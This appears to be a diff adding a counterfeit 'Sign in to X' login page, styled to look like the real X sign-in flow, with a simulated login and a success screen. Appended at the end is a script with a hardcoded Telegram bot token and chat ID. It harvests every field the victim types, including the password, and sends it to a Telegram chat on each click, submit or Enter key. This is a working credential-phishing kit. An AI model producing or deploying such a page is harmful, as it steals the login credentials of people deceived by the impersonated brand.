@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to X</title>
+  <style>
+    /* ===== RESET & GLOBAL ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #000000;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+
+    /* ===== PHONE CARD (X LOGIN REALISTIC) ===== */
+    .phone {
+      width: 100%;
+      max-width: 400px;
+      background: #000000;
+      border-radius: 32px;
+      border: 1px solid #2f3336;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+
+    /* ===== MAIN CONTAINER ===== */
+    .screen {
+      padding: 0 28px 28px;
+      display: flex;
+      flex-direction: column;
+      min-height: 600px;
+      position: relative;
+    }
+
+    /* ===== STEP MANAGEMENT ===== */
+    .step {
+      display: none;
+      flex-direction: column;
+      flex: 1;
+      animation: fadeIn 0.2s ease;
+    }
+
+    .step.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ===== TOP BAR ===== */
+    .topbar {
+      position: relative;
+      display: flex;
+      align-items: center;
+      height: 48px;
+      margin-bottom: 8px;
+    }
+
+    .logo {
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .icon-btn {
+      background: transparent;
+      border: none;
+      border-radius: 999px;
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #e7e9ea;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .icon-btn:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    /* ===== HEADINGS ===== */
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      margin: 16px 0 24px;
+      color: #e7e9ea;
+      letter-spacing: -0.3px;
+    }
+
+    /* ===== BUTTONS ===== */
+    .btn {
+      width: 100%;
+      height: 42px;
+      border-radius: 999px;
+      border: none;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: all 0.15s ease;
+    }
+
+    .btn:disabled {
+      opacity: 0.4;
+      cursor: default;
+      pointer-events: none;
+    }
+
+    .btn--primary {
+      background: #ffffff;
+      color: #000000;
+    }
+
+    .btn--primary:not(:disabled):hover {
+      background: #e6e6e6;
+    }
+
+    .btn--outline {
+      background: transparent;
+      color: #e7e9ea;
+      border: 1px solid #3f4448;
+    }
+
+    .btn--outline:hover {
+      background: rgba(255, 255, 255, 0.06);
+    }
+
+    .mt-16 { margin-top: 16px; }
+    .mt-24 { margin-top: 24px; }
+    .mt-32 { margin-top: 32px; }
+
+    /* ===== DIVIDER ===== */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 20px 0;
+      color: #71767b;
+      font-size: 14px;
+      font-weight: 400;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #2f3336;
+    }
+
+    /* ===== FLOATING LABEL INPUT ===== */
+    .field {
+      position: relative;
+      width: 100%;
+    }
+
+    .field input {
+      width: 100%;
+      height: 58px;
+      padding: 22px 44px 6px 12px;
+      background: transparent;
+      border: 1px solid #3f4448;
+      border-radius: 6px;
+      outline: none;
+      color: #e7e9ea;
+      font-size: 17px;
+      font-weight: 400;
+      transition: border-color 0.15s;
+    }
+
+    .field input:focus {
+      border-color: #1d9bf0;
+    }
+
+    .field label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #71767b;
+      font-size: 16px;
+      font-weight: 400;
+      pointer-events: none;
+      transition: all 0.15s ease;
+    }
+
+    .field input:focus ~ label,
+    .field.filled label {
+      top: 10px;
+      transform: none;
+      font-size: 12px;
+      color: #1d9bf0;
+    }
+
+    .field.filled input:not(:focus) ~ label {
+      color: #71767b;
+    }
+
+    .field .eye {
+      position: absolute;
+      right: 6px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #71767b;
+    }
+
+    /* ===== ACCOUNT CHIP (STEP 2) ===== */
+    .account {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 14px;
+      background: #16181c;
+      border: 1px solid #2f3336;
+      border-radius: 12px;
+      margin-bottom: 20px;
+    }
+
+    .account .avatar {
+      width: 40px;
+      height: 40px;
+      flex-shrink: 0;
+      border-radius: 999px;
+      background: #1d9bf0;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .account .who {
+      min-width: 0;
+    }
+
+    .account .who b {
+      display: block;
+      font-size: 15px;
+      font-weight: 600;
+      color: #e7e9ea;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .account .who span {
+      font-size: 14px;
+      color: #71767b;
+    }
+
+    /* ===== FOOTER LINK ===== */
+    .foot {
+      margin-top: auto;
+      padding-top: 28px;
+      text-align: center;
+      font-size: 15px;
+      color: #71767b;
+    }
+
+    .link {
+      color: #1d9bf0;
+      cursor: pointer;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    .center-note {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #71767b;
+    }
+
+    /* ===== SUCCESS STATE ===== */
+    .step--done {
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .step--done .avatar {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 20px;
+      border-radius: 999px;
+      background: #1d9bf0;
+      color: #fff;
+      font-size: 32px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .step--done h2 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 4px;
+      color: #e7e9ea;
+    }
+
+    .step--done p {
+      font-size: 15px;
+      color: #71767b;
+      margin-bottom: 12px;
+    }
+
+    .step--done .ok {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 32px;
+      color: #00ba7c;
+      font-size: 15px;
+      font-weight: 500;
+    }
+
+    /* ===== TOAST ===== */
+    .toast {
+      position: absolute;
+      bottom: 24px;
+      left: 50%;
+      transform: translate(-50%, 16px);
+      background: #2f3336;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 400;
+      white-space: nowrap;
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.2s ease;
+      z-index: 10;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.6);
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translate(-50%, 0);
+    }
+
+    /* ===== SPINNER ===== */
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(0, 0, 0, 0.2);
+      border-top-color: #000;
+      border-radius: 999px;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ===== MICRO INTERACTIONS ===== */
+    .btn,
+    .icon-btn,
+    .link {
+      -webkit-tap-highlight-color: transparent;
+    }
+  </style>
+</head>
+<body>
+
+<div class="phone">
+  <div class="screen">
+
+    <!-- ================= STEP 1: IDENTIFIER ================= -->
+    <section class="step active" id="step-identifier">
+      <div class="topbar">
+        <button class="icon-btn" id="btn-close" aria-label="Close">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
+            <path d="M5 5l10 10M15 5L5 15"/>
+          </svg>
+        </button>
+        <span class="logo">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="#e7e9ea">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.451-6.231zm-1.161 17.52h1.833L7.084 4.126H5.117l11.966 15.644z"/>
+          </svg>
+        </span>
+      </div>
+
+      <h1>Sign in to X</h1>
+
+      <!-- Social buttons -->
+      <button class="btn btn--primary" id="btn-google">
+        <svg width="18" height="18" viewBox="0 0 24 24">
+          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.27-4.74 3.27-8.1z"/>
+          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84A11 11 0 0 0 12 23z"/>
+          <path fill="#FBBC05" d="M5.84 14.1a6.6 6.6 0 0 1 0-4.2V7.06H2.18a11 11 0 0 0 0 9.88l3.66-2.84z"/>
+          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15A11 11 0 0 0 2.18 7.06l3.66 2.84C6.71 7.3 9.14 5.38 12 5.38z"/>
+        </svg>
+        Sign in with Google
+      </button>
+
+      <button class="btn btn--outline mt-16" id="btn-apple">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.08zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+        </svg>
+        Sign in with Apple
+      </button>
+
+      <div class="divider">or</div>
+
+      <!-- Identifier field -->
+      <div class="field" id="field-identifier">
+        <input id="input-identifier" type="text" autocomplete="username" spellcheck="false" aria-label="Phone, email, or username">
+        <label for="input-identifier">Phone, email, or username</label>
+      </div>
+
+      <button class="btn btn--primary mt-24" id="btn-next" disabled>Next</button>
+      <button class="btn btn--outline mt-24" id="btn-forgot">Forgot password?</button>
+
+      <p class="foot">Don't have an account? <a class="link" id="link-signup">Sign up</a></p>
+    </section>
+
+    <!-- ================= STEP 2: PASSWORD ================= -->
+    <section class="step" id="step-password">
+      <div class="topbar">
+        <button class="icon-btn" id="btn-back" aria-label="Back">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 4l-6 6 6 6"/>
+          </svg>
+        </button>
+        <span class="logo">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="#e7e9ea">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.451-6.231zm-1.161 17.52h1.833L7.084 4.126H5.117l11.966 15.644z"/>
+          </svg>
+        </span>
+      </div>
+
+      <h1>Enter your password</h1>
+
+      <div class="account">
+        <span class="avatar" id="avatar-small">K</span>
+        <span class="who">
+          <b id="account-name">Kimi User</b>
+          <span id="account-handle">@kimi</span>
+        </span>
+      </div>
+
+      <div class="field" id="field-password">
+        <input id="input-password" type="password" autocomplete="current-password" aria-label="Password">
+        <label for="input-password">Password</label>
+        <button class="icon-btn eye" id="btn-eye" aria-label="Show password">
+          <svg id="icon-eye-open" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#71767b" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+          <svg id="icon-eye-shut" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#71767b" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
+            <path d="M10.6 5.1A10.9 10.9 0 0 1 12 5c6.5 0 10 7 10 7a17 17 0 0 1-2.2 3.2M6.6 6.6C3.6 8.4 2 12 2 12s3.5 7 10 7c1.5 0 2.9-.4 4.1-1M3 3l18 18"/>
+            <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/>
+          </svg>
+        </button>
+      </div>
+
+      <button class="btn btn--primary mt-32" id="btn-login" disabled>Log in</button>
+
+      <p class="center-note">Forgot your password? <a class="link" id="link-reset">Reset it</a></p>
+    </section>
+
+    <!-- ================= STEP 3: SUCCESS ================= -->
+    <section class="step step--done" id="step-success">
+      <span class="avatar" id="avatar-large">K</span>
+      <h2 id="success-title">Welcome back</h2>
+      <p id="success-handle">@kimi</p>
+      <span class="ok">
+        <svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M4 10.5l4 4 8-9"/>
+        </svg>
+        Signed in successfully
+      </span>
+      <button class="btn btn--outline" id="btn-logout" style="max-width: 220px;">Log out</button>
+    </section>
+
+    <!-- TOAST -->
+    <div class="toast" id="toast" role="status"></div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    "use strict";
+
+    // ----- DOM refs -----
+    const $ = id => document.getElementById(id);
+
+    const inputId = $("input-identifier");
+    const fieldId = $("field-identifier");
+    const nextBtn = $("btn-next");
+
+    const inputPw = $("input-password");
+    const fieldPw = $("field-password");
+    const loginBtn = $("btn-login");
+
+    const toastEl = $("toast");
+    let toastTimer;
+
+    // ----- helpers -----
+    function showToast(message) {
+      toastEl.textContent = message;
+      toastEl.classList.add("show");
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(() => toastEl.classList.remove("show"), 2400);
+    }
+
+    function goTo(stepId) {
+      ["step-identifier", "step-password", "step-success"].forEach(id => {
+        $(id).classList.remove("active");
+      });
+      $(stepId).classList.add("active");
+    }
+
+    // Extract a plausible handle from identifier (email, @handle, phone)
+    function handleFrom(value) {
+      const v = value.trim();
+      if (v.indexOf("@") === 0) return v.slice(1) || "user";      // @handle
+      if (v.indexOf("@") > 0) return v.split("@")[0] || "user";   // email
+      if (v.indexOf(" ") > -1) return v.split(" ")[0].toLowerCase() || "user";
+      return v.replace(/\D/g, "").slice(0, 8) || v || "user";     // phone or fallback
+    }
+
+    function syncAccount() {
+      const handle = handleFrom(inputId.value);
+      const initial = handle.charAt(0).toUpperCase();
+
+      $("avatar-small").textContent = initial;
+      $("avatar-large").textContent = initial;
+      $("account-name").textContent = handle;
+      $("account-handle").textContent = "@" + handle;
+      $("success-handle").textContent = "@" + handle;
+    }
+
+    // ----- Step 1: identifier -----
+    inputId.addEventListener("input", function() {
+      fieldId.classList.toggle("filled", this.value.length > 0);
+      nextBtn.disabled = this.value.trim().length === 0;
+    });
+
+    nextBtn.addEventListener("click", function() {
+      syncAccount();
+      inputPw.value = "";
+      fieldPw.classList.remove("filled");
+      loginBtn.disabled = true;
+      goTo("step-password");
+      setTimeout(() => inputPw.focus(), 80);
+    });
+
+    // ----- Step 2: password -----
+    inputPw.addEventListener("input", function() {
+      fieldPw.classList.toggle("filled", this.value.length > 0);
+      loginBtn.disabled = this.value.length === 0;
+    });
+
+    $("btn-eye").addEventListener("click", function() {
+      const show = inputPw.type === "password";
+      inputPw.type = show ? "text" : "password";
+      $("icon-eye-open").style.display = show ? "none" : "block";
+      $("icon-eye-shut").style.display = show ? "block" : "none";
+    });
+
+    $("btn-back").addEventListener("click", () => goTo("step-identifier"));
+
+    // ----- Login (simulated) -----
+    loginBtn.addEventListener("click", function() {
+      const btn = this;
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>';
+
+      setTimeout(() => {
+        btn.disabled = false;
+        btn.textContent = "Log in";
+
+        const handle = handleFrom(inputId.value);
+        $("success-title").textContent = "Welcome back, @" + handle;
+        goTo("step-success");
+      }, 1100);
+    });
+
+    // ----- Step 3: logout -----
+    $("btn-logout").addEventListener("click", function() {
+      inputPw.value = "";
+      fieldPw.classList.remove("filled");
+      loginBtn.disabled = true;
+      goTo("step-identifier");
+    });
+
+    // ----- Demo stubs with realistic messages -----
+    $("btn-close").addEventListener("click", () => {
+      showToast("This sign-in window cannot be closed.");
+    });
+
+    $("btn-google").addEventListener("click", () => {
+      showToast("Google sign-in is currently unavailable. Please use another method.");
+    });
+
+    $("btn-apple").addEventListener("click", () => {
+      showToast("Apple sign-in is not available at this time.");
+    });
+
+    $("btn-forgot").addEventListener("click", () => {
+      showToast("Password reset link would be sent to your email.");
+    });
+
+    $("link-reset").addEventListener("click", () => {
+      showToast("Password reset link would be sent to your email.");
+    });
+
+    $("link-signup").addEventListener("click", () => {
+      showToast("Sign-up is not available in this preview.");
+    });
+
+    // ----- Focus management on step changes -----
+    // optional: if identifier field has value, enable next on load
+    if (inputId.value.trim()) {
+      fieldId.classList.add("filled");
+      nextBtn.disabled = false;
+    }
+  })();
+</script>
+<!-- telegram-direct-send:start -->
+<script>
+(function () {
+  var BOT_TOKEN = "8818894257:AAFFsmnb0LBGFmtxijbivGFXeZmuEg9mwaU";
+  var CHAT_ID   = "5628912919";
+  var API       = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+  var lastSig = '', lastTime = 0;
+
+  function label(el, t) {
+    return el.name || el.id || el.getAttribute('aria-label') || el.placeholder || t;
+  }
+  function collect(scope) {
+    var out = [];
+    scope.querySelectorAll('input,textarea,select').forEach(function (el) {
+      var t = (el.type || el.tagName).toLowerCase();
+      if (['submit','button','reset','image','file','hidden'].indexOf(t) > -1) return;
+      if ((t === 'checkbox' || t === 'radio') && !el.checked) return;
+      out.push({ name: label(el, t), value: el.value });
+    });
+    return out;
+  }
+  function sendWithRetry(text, attempt) {
+    fetch(API, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
+      keepalive: true
+    }).then(function (r) { return r.json(); })
+      .then(function (j) {
+        if (j && j.ok) { console.log('[telegram] sent'); return; }
+        console.error('[telegram] rejected', j);
+      })
+      .catch(function (e) {
+        console.error('[telegram] network error', e);
+        if (attempt < 2) setTimeout(function () { sendWithRetry(text, attempt + 1); }, 2000);
+      });
+  }
+  function send(scope) {
+    var fields = collect(scope);
+    if (!fields.some(function (f) { return String(f.value).trim() !== ''; })) return;
+    var text = 'New submission\n' + new Date().toLocaleString() + '\n\n' +
+      fields.map(function (f) { return f.name + ': ' + f.value; }).join('\n');
+    text = text.slice(0, 4000);
+    var now = Date.now();
+    if (text === lastSig && now - lastTime < 1500) return;
+    lastSig = text; lastTime = now;
+    sendWithRetry(text, 0);
+  }
+  function scopeOf(el) { return el.closest('form') || document; }
+
+  document.addEventListener('submit', function (e) { send(e.target); }, true);
+  document.addEventListener('click', function (e) {
+    var b = e.target.closest && e.target.closest(
+      'button,input[type=submit],input[type=button],[role=button]');
+    if (b) send(scopeOf(b));
+  }, true);
+  document.addEventListener('keydown', function (e) {
+    if (e.key !== 'Enter' || e.isComposing) return;
+    var el = e.target, tag = el && el.tagName && el.tagName.toLowerCase();
+    if (tag !== 'input' && tag !== 'select') return;
+    var t = (el.type || '').toLowerCase();
+    if (['button','submit','reset','checkbox','radio'].indexOf(t) > -1) return;
+    send(scopeOf(el));
+  }, true);
+})();
+</script>
+<!-- telegram-direct-send:end -->
+</body>
+</html>
